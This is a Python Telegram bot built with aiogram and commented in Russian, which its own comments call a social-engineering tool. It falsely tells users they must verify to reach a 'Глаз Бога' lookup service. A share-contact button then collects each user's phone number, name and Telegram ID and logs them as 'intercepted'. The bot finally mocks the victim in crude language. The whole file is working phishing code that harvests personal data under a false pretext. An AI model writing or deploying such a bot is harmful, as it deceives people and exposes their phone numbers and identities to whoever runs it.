import os
import sys

# 1. АВТО-НАСТРОЙКА ОКРУЖЕНИЯ (БЭКЕНД-МАГИЯ)
def setup_environment():
    print("[КБ-ИНФО] Начинаю автоматическую сборку проекта...")
    
    # Создаем .gitignore, если его нет
    if not os.path.exists('.gitignore'):
        with open('.gitignore', 'w', encoding='utf-8') as f:
            f.write('.env\n__pycache__/\n.venv/\n')
        print("[КБ-ИНФО] Файл .gitignore успешно создан и защищает твои ключи.")

setup_environment()

# НАСТОЯЩИЙ КОД КБ-БОТА
try:
    import asyncio
    from aiogram import Bot, Dispatcher, types
    from aiogram.filters import CommandStart
    from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
    from dotenv import load_dotenv
except ImportError:
    print("[⚠️ ОШИБКА] Библиотеки не установлены. Сначала запусти в терминале: uv pip install aiogram python-dotenv")
    sys.exit(1)

load_dotenv()
# ИСПРАВЛЕНО: Читаем строго КБ-токен из файла .env, чтобы не трогать бота девушки!
API_TOKEN = os.getenv("KB_BOT_TOKEN")

if not API_TOKEN:
    print("\n[❌ СТОП] Робот не нашел переменную KB_BOT_TOKEN! Открой файл .env и убедись, что вторая строчка называется именно KB_BOT_TOKEN=твой_токен")
    sys.exit(1)

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# Создаем КБ-клавиатуру для социальной инженерии
kb_secure = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="📱 Пройти верификацию ", request_contact=True)]
    ],
    resize_keyboard=True
)

@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    await message.answer(
        "⚠️ ДЛЯ ДОСТУПА К ГЛАЗУ БОГА НЕОБХОДИМА ВЕРИФИКАЦИЯ.\n\n"
        "Подтвердите, что аккаунт принадлежит реальному человеку. "
        "Нажмите кнопку ниже, чтобы подтвердить верификацию.", 
        reply_markup=kb_secure
    )

# Ловим официальный пакет с контактом от серверов Telegram
@dp.message(lambda msg: msg.contact is not None)
async def handle_contact(message: types.Message):
    phone = message.contact.phone_number
    name = message.contact.first_name
    last_name = message.contact.last_name or ""
    user_id = message.contact.user_id
    
    # Выводим улов прямо в терминал VS Code
    print("\n" + "="*50)
    print(f"[🔥 КБ-ПЕРЕХВАТ ЛОГОВ] Сработал триггер Социальной Инженерии!")
    print(f"👤 Имя в ТГ: {name} {last_name}")
    print(f"🆔 Telegram ID: {user_id}")
    print(f"📱 ПЕРЕХВАЧЕННЫЙ НОМЕР: {phone}")
    print("="*50 + "\n")
    
    await message.answer(
        f"ХАХАХАХАХХАХАХА\n"
        f"Ебать ты лох, твой номер вытянули.\n"
        f"Твой номер у меня: {phone}"
    )

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    print("\n" + "#"*40)
    print("[СЕРВЕР ОНЛАЙН] КБ-Бот запущен и слушает сеть...")
    print("#"*40 + "\n")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
